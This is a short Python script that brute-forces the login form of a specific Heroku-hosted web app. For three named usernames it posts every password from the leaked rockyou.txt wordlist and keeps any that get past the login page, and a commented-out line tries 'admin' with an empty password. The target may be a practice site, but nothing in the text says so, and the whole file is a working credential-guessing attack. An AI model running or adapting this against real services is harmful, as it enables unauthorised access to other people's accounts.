import requests,string,random


usernames = ['Molly','bleepbloop','nom']
passwords = []
for name in usernames:
    print(name)
    for line in open('C:\\Users\\fartoncats\\Downloads\\rockyou.txt'):
        print(line)
        r = requests.post('https://salty-reef-80979.herokuapp.com/login',data={'username':name,'password':line})
        if "Login" not in r.text:
            passwords.append(line)
            break;
    #r = requests.post('https://salty-reef-80979.herokuapp.com/login',data={'username':'admin','password':''})
    #print("Login" not in r.text)
print(passwords)